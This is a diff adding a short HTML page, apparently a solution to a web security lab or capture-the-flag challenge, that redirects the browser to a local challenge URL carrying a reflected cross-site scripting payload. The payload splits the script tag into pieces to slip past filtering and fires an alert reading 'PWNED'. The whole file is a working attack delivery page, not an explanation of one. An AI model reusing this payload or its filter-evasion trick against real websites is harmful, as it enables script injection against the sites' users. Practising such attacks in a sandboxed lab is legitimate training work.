@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        var payload = '<scr' + 'ipt>alert("PWNED")</scr' + 'ipt>';
+        var encoded = encodeURIComponent(payload);
+        window.location.href = 'http://challenge.localhost/ephemeral?msg=' + encoded;
+    </script>
+</body>
+</html>
